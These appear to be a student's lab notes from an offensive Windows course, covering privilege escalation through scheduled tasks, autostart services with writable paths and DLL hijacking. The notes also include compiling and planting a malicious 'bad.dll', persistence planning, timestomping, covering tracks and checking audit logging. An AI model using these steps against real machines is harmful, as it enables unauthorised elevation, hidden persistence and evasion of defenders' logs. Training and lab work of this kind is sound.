```Powershell
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive
DEMO: Finding vulnerable Scheduled Tasks
# The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:

schtasks /query /fo LIST /v #List all Tasks in List format
schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN" #Select-String can utilize regex to output only values that match
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6 #Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch #Excludes results that we dont want to seein order to help narrow down vulnerable directory locations

#Open and view tasks from the Task Scheduler GUI Application
#Identify the following vulnerable Task:
C:\Users\student\exercise_2\putty.exe
Run: sigcheck c:\users\student\exercise_2\putty.exe
#Determines information we can use to research for vulnerabilities
Run: icacls "c:\users\student\exercise_2"
#Check if the directory can be written to, as it is non-standard

There Query will show all the tasks that are running
Identify and document the service information associated with the path
```
```CMD
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | findstr /i "7z.exe"

icacls putty.exe
this will show you your permissions of the program(you don't, but you can cacls the folder the program is located in)
```
1. Find out which DLLs are used by the application your tyring to run
   1. open procmon
      1. Process Name CONTAINS
      2. results CONTAINS
      3. Path CONTAINS

# test clipboard
base64 bad.dll | xclip -selection clipboard
- open a notepad in windows copy/pastsave
# Create Nano file on linux with code
cd into folder with bad.c in it
run the below command on the fill
i686-w64-mingw32-g++ -c bad.c -o bad.o
i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
# now move over to windows box
scp student@10.50.34.63:/home/student/bad.dll .
# THis will pull the file from the linux-ops to the windows machine
Run: certutil -decode bad.txt SSPICLI.dll
- check source code for dll
  




# Vulnerable Services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" 
- every service that is autostart, that does not start in c:\windows
icacls "c:\Program Files\Windows Photo Viewer"
C:\Users\student\exercise_2>icacls "c:\Program Files\7-Zip\7z.exe"
c:\Program Files\7-Zip\7z.exe BUILTIN\Users:(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Administrators:(I)(F)
- If you have full control/Modify you know you can modfy this execution
- ACCOUNT ACCESS
- create your own service and place it on the box
- open your services management tool
  - filter by description
  - look at ones without descriptions
## DEMO finding vulnerbale services
Survives:
1. Reboots
2. Credential changes
3. DHCP IP reassignment
Considerations include:
1. File naming
2. File location
3. Timestomping
4. Port selection
Covering Tracks
LOGS
- Artifacts
  - event LOGS
    - Applications, Security, Setup, System
  - Blending
  - Timestomping
## DEMO Audit Logging
auditpol /get /category:*
auditpol /get /category:* | findstr /i "success failure"
Im MS Event IDs
4624/4625   - Successful/failed login
4720        - Account created
4672        - Administrative user logged on
7045        - Service created
## DEMO: Event Logging
Storage: c:\windows\system32\config\
File-Type: .evtx/.evt

wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List
## DEMO: Additional Logging
Determine PS version (bunch of ways)
- reg query hklm\software\microsoft\powershell\3\powershellengine\
- powershell -command "$psversiontable"
Determine if logging is set (PowerShell and WMIC)
- reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
- reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging # 0 = no | 1 = errors | 2 = verbose
WMIC Log Storage
- %systemroot%\system32\wbem\Logs\